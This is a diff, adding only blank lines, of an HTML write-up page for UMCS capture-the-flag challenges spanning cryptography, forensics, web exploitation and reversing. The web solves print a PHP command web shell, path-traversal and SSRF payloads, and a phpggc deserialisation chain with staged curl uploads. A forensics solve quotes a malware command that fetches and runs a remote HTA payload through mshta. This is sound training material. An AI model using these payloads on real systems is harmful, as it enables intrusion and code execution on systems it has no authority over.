@@ -61,11 +61,13 @@
               <li class="solve-step"><h4>Identify the supplied files</h4>
                 <p>I first reviewed the challenge page and the two downloads. The stated mission was to reconstruct the vault and use the HR policy as a guide, which established that scraps.md was likely needed to derive the password rather than merely being background text.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/the-hexed-protocol-1.webp" alt="The Hexed Protocol challenge page showing the scraps.md and vault_dump.txt downloads" loading="lazy"><figcaption>The challenge provides the HR memo and the obfuscated vault dump; the mission explicitly connects the two files.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Convert the hexadecimal dump and identify its format</h4>
                 <p>I converted vault_dump.txt back into bytes, then checked the resulting file type. This was the quickest way to determine what kind of data the password would protect. The converted file was identified as a KeePass database (KDBX), so I could use the normal KeePass hash-recovery workflow.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>cat vault_dump.txt | xxd -r -p &gt; vault.bin
 file vault.bin</code></pre>
@@ -75,6 +77,7 @@ file vault.bin</code></pre>
               <li class="solve-step"><h4>Build a password-policy wordlist</h4>
                 <p>I read scraps.md closely and used its policy words — Synergy, Disruption, Pivot, Agility, and Paradigm — as the fixed word portion of each candidate. The policy also described a four-digit PIN and a special character, so I generated every combination in that pattern instead of using an unrelated generic list.</p>
                 <p>This was deliberate: the source described the corporate policy as the important clue. Constraining the candidates to its structure made the attack reproducible and much smaller than trying arbitrary password combinations.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>values = [&quot;Synergy&quot;, &quot;Disruption&quot;, &quot;Pivot&quot;, &quot;Agility&quot;, &quot;Paradigm&quot;]
 specials = &quot;!@#$%^&amp;*()-_=+[{]};:&#x27;\&quot;,&lt;.&gt;/?~`|&quot;
@@ -89,6 +92,7 @@ with open(&quot;passlist.txt&quot;, &quot;w&quot;) as f:
               </li>
               <li class="solve-step"><h4>Extract and crack the KeePass hash</h4>
                 <p>With a KDBX file and a policy-shaped wordlist, I extracted the database hash with keepass2john and passed it to John the Ripper. John recovered the master password as Paradigm4092@, matching the pattern derived from the memo.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>keepass2john vault.bin &gt; vault.hash
 john --wordlist=passlist.txt vault.hash</code></pre>
@@ -98,6 +102,7 @@ john --wordlist=passlist.txt vault.hash</code></pre>
               <li class="solve-step"><h4>Open the vault and read the stored note</h4>
                 <p>I opened the recovered database with kpcli using the cracked password. After listing Root/, I found the Master Infrastructure entry and displayed its fields. Its Notes field contained the flag.</p>
                 <p>The published terminal image is cropped above the prompt so it does not expose the local machine username, hostname, or filesystem path visible in the original screenshot.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>kpcli --kdb vault.bin
 cd Root/
@@ -123,11 +128,13 @@ show -f 0</code></pre>
               <li class="solve-step"><h4>Translate the message and identify the PRNG clue</h4>
                 <p>I read the Braille message first because it describes the recovered script and the stalled IDs. I then inspected the leaked logic and recognised the state-prediction pattern instead of treating the hex strings as a static cipher.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/makmal-buta-um-1.webp" alt="Makmal Buta UM challenge page with the Braille message" loading="lazy"><figcaption>The challenge supplies the Braille message that frames the recovered-log investigation.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Recover the MT19937 state</h4>
                 <p>I extracted every 32-bit ID from output.txt. I used the first 624 outputs to reverse MT19937 tempering, then cloned the generator so it could predict the remaining values.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>ids = [int(x, 16) for x in re.findall(r&#x27;ID: (0x[0-9a-fA-F]{8})&#x27;, data)]
 state = [untemper(value) for value in ids[:624]]
@@ -137,6 +144,7 @@ rng = MT19937Clone(state)</code></pre>
               </li>
               <li class="solve-step"><h4>XOR predicted values with the encrypted tail</h4>
                 <p>For each ID after the recovered state, I predicted the next generator output and XORed it with the encrypted value. The resulting characters assembled the flag.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>out = []
 for encrypted in ids[624:]:
@@ -162,6 +170,7 @@ print(&#x27;&#x27;.join(out))</code></pre>
               <ol>
               <li class="solve-step"><h4>Use the PNG header as known plaintext</h4>
                 <p>I treated the PNG magic bytes as known plaintext and XORed them against the corrupted first bytes. This produced the first rolling-key values rather than a single static key.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>k0 = ciphertext[0] ^ 0x89
 k1 = ciphertext[1] ^ 0x50
@@ -173,6 +182,7 @@ drift = (k1 - k0) % 256</code></pre>
               </li>
               <li class="solve-step"><h4>Decrypt every byte and write the image</h4>
                 <p>I applied the evolving key across the full ciphertext and wrote the plaintext to recovered_flag.png. The recovered image displayed the flag.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>plaintext = bytearray()
 for i, value in enumerate(ciphertext):
@@ -198,6 +208,7 @@ open(&#x27;recovered_flag.png&#x27;, &#x27;wb&#x27;).write(plaintext)</code></pr
               <ol>
               <li class="solve-step"><h4>Inspect and subtract the stereo channels</h4>
                 <p>I checked the audio format, then read its frames as signed 16-bit stereo samples. Subtracting the right channel from the left produced a mono signal that isolated the hidden beeps.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>soxi DTC_Midnight.wav</code></pre>
                 <p class="code-language">python</p>
@@ -209,11 +220,13 @@ hidden = (samples[:, 0] - samples[:, 1]).astype(&#x27;&lt;i2&#x27;)</code></pre>
               <li class="solve-step"><h4>Decode the hidden Morse and Vigenère text</h4>
                 <p>I saved the channel-difference signal and decoded its beep pattern as LUYKB BFZEJNHPKEXGNTOTH IUYCO. I then tested a Vigenère cipher because the source identified it as the likely cipher, using TUNKU from the Dewan Tunku Canselor reference as the key.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/phantom-anthem-of-dtc-2.webp" alt="Decoded Morse text from the phase-cancelled audio" loading="lazy"><figcaption>The isolated audio yields the ciphertext that is then decrypted with the DTC-derived key.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Remove the deliberate misleading words</h4>
                 <p>The Vigenère result was SALAH ILMUPUNCAKEMAJUAN PALSU. The source identifies SALAH and PALSU as decoys, leaving ILMU PUNCA KEMAJUAN; I formatted those words as instructed.</p>
+
 
 
 
@@ -236,11 +249,13 @@ hidden = (samples[:, 0] - samples[:, 1]).astype(&#x27;&lt;i2&#x27;)</code></pre>
               <li class="solve-step"><h4>Read the spectrogram coordinates</h4>
                 <p>I recorded the coordinate set shown in the spectrogram and calculated the sum of their products. The source says this gives the starting offset 65, which became the initial position for extraction.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/acoustic-strings-1.webp" alt="Acoustic Strings spectrogram containing coordinate text" loading="lazy"><figcaption>The spectrogram presents the coordinate sequence used by the solve.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Document the discarded fretboard approach</h4>
                 <p>I manually mapped fret and string intersections, but the source records this as a rabbit hole rather than the final method. I kept that observation in mind and pivoted after finding the red marker and a blue pixel in the image.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/acoustic-strings-2.webp" alt="Red pixel marker found during Acoustic Strings image analysis" loading="lazy"><figcaption>The red marker is one of the image observations used to redirect the solve.</figcaption></figure>
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/acoustic-strings-3.webp" alt="Blue pixel observation during Acoustic Strings image analysis" loading="lazy"><figcaption>The blue pixel confirms that colour values, rather than only fret coordinates, matter to the extraction.</figcaption></figure>
@@ -248,6 +263,7 @@ hidden = (samples[:, 0] - samples[:, 1]).astype(&#x27;&lt;i2&#x27;)</code></pre>
               </li>
               <li class="solve-step"><h4>Run the image extraction helper</h4>
                 <p>Using the source helper, I read the image at the derived offset and followed the reported trace values until the reconstructed message printed the flag.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/acoustic-strings-4.webp" alt="Acoustic Strings extraction helper output displaying the flag" loading="lazy"><figcaption>The helper output shows the derived start offset and recovered flag.</figcaption></figure>
 
@@ -274,6 +290,7 @@ hidden = (samples[:, 0] - samples[:, 1]).astype(&#x27;&lt;i2&#x27;)</code></pre>
               <ol>
               <li class="solve-step"><h4>Isolate the signal traffic</h4>
                 <p>I filtered TCP traffic for destination ports 4444, 4445, and 4446. This removed the decoys and left the payload fragments that the source associates with the hidden data.</p>
+
                 <p class="code-language">wireshark filter</p>
                 <pre><code>tcp.dstport == 4444 || tcp.dstport == 4445 || tcp.dstport == 4446</code></pre>
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/packet-puzzle-1.webp" alt="Packet Puzzle challenge page" loading="lazy"><figcaption>The supplied packet capture is the starting point for the reconstruction.</figcaption></figure>
@@ -281,6 +298,7 @@ hidden = (samples[:, 0] - samples[:, 1]).astype(&#x27;&lt;i2&#x27;)</code></pre>
               </li>
               <li class="solve-step"><h4>Join and decode payloads</h4>
                 <p>I concatenated payloads in port order — 4444, then 4445, then 4446 — and Base64-decoded the joined stream. The result was a PNG-like byte sequence, but its signature and chunk names were deliberately damaged.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>combined = b&#x27;&#x27;.join(b&#x27;&#x27;.join(payloads[p]) for p in [4444, 4445, 4446])
 raw = bytearray(base64.b64decode(combined))</code></pre>
@@ -289,6 +307,7 @@ raw = bytearray(base64.b64decode(combined))</code></pre>
               </li>
               <li class="solve-step"><h4>Repair the PNG structure</h4>
                 <p>I restored the eight-byte PNG signature, changed IHDU back to IHDR, and changed the last IENU marker back to IEND. I then recalculated each PNG chunk CRC, because changing chunk names invalidates the original checksums.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>raw[0:8] = b&#x27;\x89PNG\r\n\x1a\n&#x27;
 raw[12:16] = b&#x27;IHDR&#x27;
@@ -299,6 +318,7 @@ raw[raw.rfind(b&#x27;IENU&#x27;):raw.rfind(b&#x27;IENU&#x27;) + 4] = b&#x27;IEND
               </li>
               <li class="solve-step"><h4>Read the repaired output</h4>
                 <p>The repaired PNG displayed the flag across the image. This confirmed that the ordered payload reconstruction and CRC repair were both correct.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/packet-puzzle-2.webp" alt="Repaired Packet Puzzle image showing the flag" loading="lazy"><figcaption>The repaired image displays the complete flag across two corners.</figcaption></figure>
 
@@ -320,6 +340,7 @@ raw[raw.rfind(b&#x27;IENU&#x27;):raw.rfind(b&#x27;IENU&#x27;) + 4] = b&#x27;IEND
               <ol>
               <li class="solve-step"><h4>Locate the markers</h4>
                 <p>I searched the executable, core dump, and JPEG for readable markers. WINSHOT marked the appended ciphertext in pool, while CUE_BALL_STATE_V1 located the relevant state in the core dump.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>strings -a winning_shot | less
 strings -a core.170390 | grep -i CUE
@@ -329,6 +350,7 @@ strings -a pool | grep -i WIN</code></pre>
               </li>
               <li class="solve-step"><h4>Derive the XOR inputs</h4>
                 <p>The source records the encrypted flag at offset 0x12f1 with length 45, and the key marker at 0x36e8. The 60-byte key begins at 0x3708, so the plaintext relationship is ciphertext byte XOR key byte modulo the key length.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>ciphertext = pool[pool.rfind(b&#x27;WINSHOT&#x27;) + len(b&#x27;WINSHOT&#x27;):]
 key = core[core.find(b&#x27;CUE_BALL_STATE_V1&#x27;) + 0x20:][:60]
@@ -338,6 +360,7 @@ plaintext = bytes(c ^ key[i % len(key)] for i, c in enumerate(ciphertext))</code
               </li>
               <li class="solve-step"><h4>Validate the decrypted flag</h4>
                 <p>I searched the decrypted bytes for the UMCS flag format. The extracted text matched the expected flag syntax, confirming the marker offsets and repeating-key XOR operation.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>match = re.search(rb&#x27;UMCS\{[^}]+\}&#x27;, plaintext)
 print(match.group().decode())</code></pre>
@@ -366,6 +389,7 @@ print(match.group().decode())</code></pre>
               <ol>
               <li class="solve-step"><h4>Read the creation command</h4>
                 <p>I inspected the recorded echo command because it preserves the complete dropped-note content.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>VU1DU3szel9mMXJzN19nbGFmXzR0X3I0bnNvbV9uMFQzfQ==</code></pre>
 
@@ -373,6 +397,7 @@ print(match.group().decode())</code></pre>
               </li>
               <li class="solve-step"><h4>Decode the embedded value</h4>
                 <p>Decoding the Base64 text recovered the flag from the ransom note.</p>
+
 
 
 
@@ -394,6 +419,7 @@ print(match.group().decode())</code></pre>
               <ol>
               <li class="solve-step"><h4>Inspect Edge history</h4>
                 <p>The History database showed a 2026-04-19 entry titled reCAPTCHA Verification at pinarat.github.io/a/. Its fake branding made it the suspicious pivot.</p>
+
                 <p class="code-language">sql</p>
                 <pre><code>SELECT last_visit_time, title, url FROM urls;</code></pre>
 
@@ -416,6 +442,7 @@ print(match.group().decode())</code></pre>
               <ol>
               <li class="solve-step"><h4>Recover the clipboard command</h4>
                 <p>The script staged mshta https://pinarat.github.io/a/b.mp4. Although named as media, b.mp4 was an HTA payload that downloaded rizzler.bat.</p>
+
                 <p class="code-language">javascript</p>
                 <pre><code>const commandToRun = `mshta https://pinarat.github.io/a/b.mp4`;
 stageClipboard(commandToRun, verification_id);</code></pre>
@@ -424,6 +451,7 @@ stageClipboard(commandToRun, verification_id);</code></pre>
               </li>
               <li class="solve-step"><h4>Read the batch stage</h4>
                 <p>The batch file wrote a registry value containing the flag. The registry command itself is intentionally described rather than reproduced because the source formatting makes its Windows backslashes ambiguous.</p>
+
 
 
 
@@ -445,6 +473,7 @@ stageClipboard(commandToRun, verification_id);</code></pre>
               <ol>
               <li class="solve-step"><h4>Extract image payload bytes</h4>
                 <p>I read the size from pixels (0,0) and (1,0), then consumed RGB channels from pixel index 2 until that size was reached. The decoded PowerShell contained the literal UMCS string and wrote Ditto.exe for the next stage.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>size = (p0[0] &lt;&lt; 24) | (p0[1] &lt;&lt; 16) | (p0[2] &lt;&lt; 8) | p1[0]
 xored = bytes(c ^ KEY[i % len(KEY)] for i, c in enumerate(buf))
@@ -472,6 +501,7 @@ text = gzip.decompress(xored).decode(&#x27;utf-8&#x27;, errors=&#x27;replace&#x2
 
 
 
+
               </li>
               </ol>
               <h4>Result</h4><p>C2 channel history supplied the encoded message and flag.</p>
@@ -490,6 +520,7 @@ text = gzip.decompress(xored).decode(&#x27;utf-8&#x27;, errors=&#x27;replace&#x2
               <ol>
               <li class="solve-step"><h4>Extract the archive</h4>
                 <p>I used the logged password with 7z to extract LOCKED.7z. important.txt showed that the fictional victim reused one value across accounts.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>7z x LOCKED.7z -p&#x27;GcJqVl9YaVwBIPC4nbOW&#x27; -ounlocked</code></pre>
 
@@ -512,6 +543,7 @@ text = gzip.decompress(xored).decode(&#x27;utf-8&#x27;, errors=&#x27;replace&#x2
               <ol>
               <li class="solve-step"><h4>Locate and hash the three artifacts</h4>
                 <p>I used find to identify the two possible batch filenames, profile.png, and Ditto.exe, then combined the three SHA-256 values into the flag format.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>H1=$(sha256sum &quot;$RIZZLER&quot; | awk &#x27;{print $1}&#x27;)
 H2=$(sha256sum &quot;$PROFILE&quot; | awk &#x27;{print $1}&#x27;)
@@ -544,12 +576,14 @@ echo &quot;UMCS{$H1, $H2, $H3}&quot;</code></pre>
                 <p>The challenge page presented the curl application and its downloadable files. I used that starting point to inspect how uploaded configuration files were consumed rather than trying random request parameters.</p>
                 <p>The source showed that a submitted configuration was passed to curl with -K. Its setup also stored the flag in Redis on 127.0.0.1, making the curl configuration the bridge to the internal service.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/redistribute-1.webp" alt="REDISTRIBUTE challenge page with the downloadable files link" loading="lazy"><figcaption>The challenge page identifies the curl application and provides the files used for source review.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Create the Redis request configuration</h4>
                 <p>I wrote a curl configuration that targets 2130706433:6379, the integer representation of the loopback address. This avoids relying on the literal 127.0.0.1 string while still reaching the same interface.</p>
                 <p>The configuration uses HTTP/1.0 and HTTP/0.9 handling and sends GET flag as the request body. I uploaded it to the curl endpoint and saved the response for inspection.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>silent
 variable = %{FLAG}
@@ -562,6 +596,7 @@ expand-write-out = &quot;{{FLAG}}\n&quot;</code></pre>
               </li>
               <li class="solve-step"><h4>Read the returned value</h4>
                 <p>After the upload completed, I listed the response files and searched the saved response for the flag format. The internal Redis request had returned the flag value.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>grep -o &#x27;UMCS{[^}]*}&#x27; response.html</code></pre>
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/redistribute-3.webp" alt="Terminal output showing grep extracting the REDISTRIBUTE flag" loading="lazy"><figcaption>Searching the saved response extracts the flag returned through the internal Redis request.</figcaption></figure>
@@ -585,12 +620,14 @@ expand-write-out = &quot;{{FLAG}}\n&quot;</code></pre>
               <li class="solve-step"><h4>Start from the report endpoint</h4>
                 <p>The challenge page described a website that displays university results. I used the report function first because it was the endpoint intended to load a student file and therefore was most likely to expose path handling.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/guess-the-pin-1.webp" alt="Guess The Pin challenge page" loading="lazy"><figcaption>The challenge page introduces the university-results website and its flag-in-environment-variable hint.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Trigger the debugger and inspect the file filter</h4>
                 <p>Requesting the report route without a usable student value produced a Werkzeug traceback. The error page revealed the report handler and showed that it applied replace(&#x27;../&#x27;, &#x27;&#x27;) before opening a file.</p>
                 <p>I then used ....//app.py. After the weak replacement, that leaves ../app.py, so it bypasses the intended traversal filter and reads the application source.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>/report?student=....//app.py</code></pre>
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/guess-the-pin-2.webp" alt="Werkzeug traceback showing the report handler and weak replace filter" loading="lazy"><figcaption>The traceback exposes the replace(&#x27;../&#x27;, &#x27;&#x27;) filter used before the application opens the requested report.</figcaption></figure>
@@ -600,11 +637,13 @@ expand-write-out = &quot;{{FLAG}}\n&quot;</code></pre>
               <li class="solve-step"><h4>Collect the debugger inputs</h4>
                 <p>With traversal working, I read the values required by Werkzeug&#x27;s debugger PIN algorithm, including the MAC address, boot ID, package data, and application details. I reproduced the SHA-1 calculation from the debugger implementation rather than guessing the PIN.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/guess-the-pin-4.webp" alt="Output showing the calculated Werkzeug PIN" loading="lazy"><figcaption>The reconstructed calculation produces the debugger PIN used for the console.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Unlock the console and read the flag</h4>
                 <p>I entered the calculated PIN at /console and used the interactive console to locate and read the flag. The console output returned the final value.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>113-197-073</code></pre>
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/guess-the-pin-5.webp" alt="Werkzeug interactive console showing the flag command and output" loading="lazy"><figcaption>The unlocked console reads the flag and displays the returned value.</figcaption></figure>
@@ -629,12 +668,14 @@ expand-write-out = &quot;{{FLAG}}\n&quot;</code></pre>
                 <p>The challenge page states that uploaded archives are inspected before extraction. The abc != ABC hint made extension-case testing more useful than trying to bypass the upload with a disguised filename.</p>
                 <p>I tested payload.php, payload.pHp, and payload.PHP. The uppercase form passed the flawed check, so I placed shell.PHP inside a ZIP archive.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/zip-a-dip-doo-dah-1.webp" alt="Zip-a-Dip-Doo-Dah challenge page and instance button" loading="lazy"><figcaption>The challenge page supplies the ZIP-upload context and the case-sensitive hint.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Upload and trigger the shell</h4>
                 <p>The archive contained a small PHP command shell. After upload, the response exposed the random extraction directory; I used that directory to invoke shell.PHP.</p>
                 <p>The first request ran id to verify that the uploaded PHP executed as the web server user. I then requested cat /flag.txt through the same shell.</p>
+
                 <p class="code-language">php</p>
                 <pre><code>&lt;?php system($_GET[&#x27;c&#x27;] ?? &#x27;id&#x27;); ?&gt;</code></pre>
                 <p class="code-language">text</p>
@@ -660,12 +701,14 @@ expand-write-out = &quot;{{FLAG}}\n&quot;</code></pre>
               <li class="solve-step"><h4>Identify the upload constraint</h4>
                 <p>The challenge page and downloadable ZIP established that uploaded PHP is executed, but the WAF restricts the number of distinct characters. That made conventional PHP syntax unsuitable and shifted the work toward generating it at runtime.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/fuk-u-php-1.webp" alt="FUK U PHP challenge page with the downloadable challenge archive" loading="lazy"><figcaption>The challenge page provides the PHP upload context and downloadable files for inspecting the restriction.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Build a five-character payload</h4>
                 <p>I first explored a format-string idea, then discarded it after confirming that only file_size was supplied to the relevant format operation. I instead used 9.^() to construct the needed PHP fragments through XOR and concatenation, with FFI as described in the solve.</p>
                 <p>That generated payload satisfied the unique-character check while still creating the database query path needed to read the flag.</p>
+
                 <p class="code-language">sql</p>
                 <pre><code>select load_file(0x2f666c6167)</code></pre>
 
@@ -673,6 +716,7 @@ expand-write-out = &quot;{{FLAG}}\n&quot;</code></pre>
               </li>
               <li class="solve-step"><h4>Trigger the uploaded payload</h4>
                 <p>The generated PHP connected to the local challenge database and called LOAD_FILE with the hexadecimal representation of /flag. Its output showed the flag value, confirming that the constrained-character payload executed successfully.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/fuk-u-php-2.webp" alt="Terminal output from the FUK U PHP payload showing the returned flag" loading="lazy"><figcaption>The uploaded payload runs and prints the flag recovered through the database LOAD_FILE call.</figcaption></figure>
 
@@ -695,6 +739,7 @@ expand-write-out = &quot;{{FLAG}}\n&quot;</code></pre>
               <li class="solve-step"><h4>Trace the remember-me cookie to unsafe deserialisation</h4>
                 <p>The application&#x27;s _read_remember_token() method reads nx_remember with get_cookie(..., true) and returns unserialize($raw). That is the object-injection primitive: a cookie supplied by the client can cause PHP to instantiate attacker-controlled objects.</p>
                 <p>I used the supplied CRM archive to confirm this flow before choosing a gadget. The source identifies Guzzle&#x27;s FileCookieJar as the usable chain because its normal object behaviour can be directed to write a chosen file.</p>
+
                 <p class="code-language">php</p>
                 <pre><code>private function _read_remember_token()
 {
@@ -708,6 +753,7 @@ expand-write-out = &quot;{{FLAG}}\n&quot;</code></pre>
               <li class="solve-step"><h4>Generate the Guzzle file-write payload</h4>
                 <p>I used phpggc locally with the Guzzle/FW1 chain to target uploads/stage1.php. The target path is the web-accessible uploads directory inside the challenge container.</p>
                 <p>The first-stage file is intentionally small. On a POST containing d, it base64-decodes d and writes it as runner.php beside itself; without d, it prints READY. This confirms the first write before the much larger runner is sent.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>docker exec nexnew-ctf php /tmp/phpggc/phpggc -f -u -A Guzzle/FW1 \
   /var/www/html/uploads/stage1.php /tmp/exploit_stage1.php</code></pre>
@@ -726,6 +772,7 @@ if (isset($_POST[&#x27;d&#x27;])) {
               <li class="solve-step"><h4>Trigger the deserialisation and validate stage one</h4>
                 <p>I placed the phpggc serialised object in the nx_remember cookie and sent it to the application. That causes the FileCookieJar gadget to create stage1.php on the server.</p>
                 <p>I then requested uploads/stage1.php directly. Its READY response confirmed the cookie path, gadget chain, destination directory, and PHP execution before proceeding to the bypass stage.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>curl -s -o /dev/null \
   -H &quot;Cookie: nx_remember=&lt;PHPGGC_PAYLOAD&gt;&quot; \
@@ -739,6 +786,7 @@ curl &lt;TARGET&gt;/uploads/stage1.php
               <li class="solve-step"><h4>Upload the patched runner</h4>
                 <p>The second-stage runner was a patched mm0r1 php-concat-bypass for PHP 8.1. The source notes that pack() was also disabled on this target, so a patched variant was needed.</p>
                 <p>Its command writes the readflag output to uploads/f.txt. I Base64-encoded runner_writeflag.php and sent it as d to the verified stage1.php endpoint. The WROTE response confirmed that runner.php had been created.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>RUNNER_B64=$(base64 -w0 runner_writeflag.php)
 curl -X POST --data-urlencode &quot;d=${RUNNER_B64}&quot; \
@@ -752,6 +800,7 @@ curl -X POST --data-urlencode &quot;d=${RUNNER_B64}&quot; \
               <li class="solve-step"><h4>Retry the unstable runner and collect f.txt</h4>
                 <p>The source records that the bypass was unreliable on the remote instance. I therefore triggered runner.php repeatedly, waited briefly between requests, and fetched f.txt after each attempt instead of assuming the first execution completed.</p>
                 <p>Once f.txt returned HTTP 200 with text/plain content, its body contained the final flag. The repeated loop is part of the documented solve rather than an unrelated brute-force step.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>for i in $(seq 1 25); do
   curl -s &lt;TARGET&gt;/uploads/runner.php &gt; /dev/null
@@ -787,6 +836,7 @@ done
               <li class="solve-step"><h4>Identify the oversized Matroska container</h4>
                 <p>I used file and ffprobe on Noisy_Penguins.mkv. They identified it as Matroska data and confirmed that a short video wrapper was being used, which did not account for its roughly 46 MB size.</p>
                 <p>That mismatch was the reason to inspect the container rather than only watch the clip. The challenge page&#x27;s Pingu wording also suggested that the apparent video might be a wrapper around another artifact.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>file Noisy_Penguins.mkv
 ffprobe Noisy_Penguins.mkv</code></pre>
@@ -795,6 +845,7 @@ ffprobe Noisy_Penguins.mkv</code></pre>
               </li>
               <li class="solve-step"><h4>Extract the attached video</h4>
                 <p>I asked ffmpeg to dump attachment stream 0 from the Matroska container. This extracted PINGU.mp4, the real target embedded inside the outer file.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>ffmpeg -dump_attachment:t:0 PINGU.mp4 -i Noisy_Penguins.mkv -f null -</code></pre>
 
@@ -804,12 +855,14 @@ ffprobe Noisy_Penguins.mkv</code></pre>
                 <p>Inspecting PINGU.mp4 streams revealed a hidden mov_text subtitle track. I extracted the subtitles and found five Base64 strings; the valid first and last fragments read UMCS{as and u1n_n00t}, while FAKE_FlAg and NeverGonnaGiveYouUp were explicit decoys.</p>
                 <p>The third fragment was corrupted, so I did not force its Base64 output into the flag. The sanitised screenshot records the subtitle chunks without the original local terminal prompt or path.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/noisy-penguins-2.webp" alt="Subtitle file showing Base64 fragments extracted from PINGU.mp4" loading="lazy"><figcaption>The extracted subtitle track contains five Base64 chunks; the first, third, and fourth are the relevant flag pieces.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Repair the noisy third fragment</h4>
                 <p>The title refers to the audio track. The source&#x27;s spectrogram analysis of its tone bursts showed that the corrupted third value MxMV9wM25H should be c2MxMV9wM25H.</p>
                 <p>Decoding that repaired value gives sc11_p3nG. I joined it between the valid opening and closing fragments and ignored the two deliberate decoys.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>UMCS{as + sc11_p3nG + u1n_n00t}</code></pre>
 
@@ -833,11 +886,13 @@ ffprobe Noisy_Penguins.mkv</code></pre>
               <li class="solve-step"><h4>Confirm the target and choose offline access</h4>
                 <p>The challenge page points to the administrator&#x27;s Desktop. I kept the VMDK offline and used guestfish in read-only mode because no account credentials were provided and no system execution was needed.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/noentry-1.webp" alt="NoEntry challenge page describing the administrator Desktop target" loading="lazy"><figcaption>The challenge establishes the target location and provides the disk artifact.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Mount the VMDK read-only</h4>
                 <p>I opened the disk with guestfish&#x27;s read-only option and inspected the mounted filesystem. The published capture begins after the local shell prompt and command, retaining only the guest-filesystem session.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>guestfish --ro -a &quot;NoEntry-disk1.vmdk&quot; -i</code></pre>
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/noentry-2.webp" alt="Guestfish session mounted on the virtual disk" loading="lazy"><figcaption>guestfish opens the Windows guest filesystem in read-only mode without booting the virtual machine.</figcaption></figure>
@@ -845,6 +900,7 @@ ffprobe Noisy_Penguins.mkv</code></pre>
               </li>
               <li class="solve-step"><h4>Traverse to the administrator Desktop and read the flag</h4>
                 <p>I listed the root, Users, Administrator, and Desktop directories in order. The Desktop listing included flag.txt, so I read that file directly from the mounted disk.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>ls /
 ls /Users
@@ -880,9 +936,11 @@ cat /Users/Administrator/Desktop/flag.txt</code></pre>
 
 
 
+
               </li>
               <li class="solve-step"><h4>Decode the Base64 text</h4>
                 <p>I decoded the extracted value as Base64. Its plaintext is the flag, matching the result shown in the sanitised final-output capture.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/cloud-ai-whisperer-1.webp" alt="Sanitised Cloud AI Whisperer log and decoded flag output" loading="lazy"><figcaption>The readable log context and final flag are retained; only the token and local terminal identifiers are masked.</figcaption></figure>
 
@@ -910,12 +968,14 @@ cat /Users/Administrator/Desktop/flag.txt</code></pre>
               <li class="solve-step"><h4>Inspect the challenge binary</h4>
                 <p>The challenge page supplied the Varsity Lake executable. I treated it as a static reverse-engineering problem and began by checking its strings for packer indicators.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/varsity-lake-sonata-1.webp" alt="Varsity Lake Sonata challenge page" loading="lazy"><figcaption>The challenge provides the packed ELF used for the static analysis.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Unpack UPX and find the comparison logic</h4>
                 <p>UPX text in the binary justified unpacking it before decompilation. After opening unpacked.bin in Ghidra, I searched for the success message, then cross-referenced it to the flag check.</p>
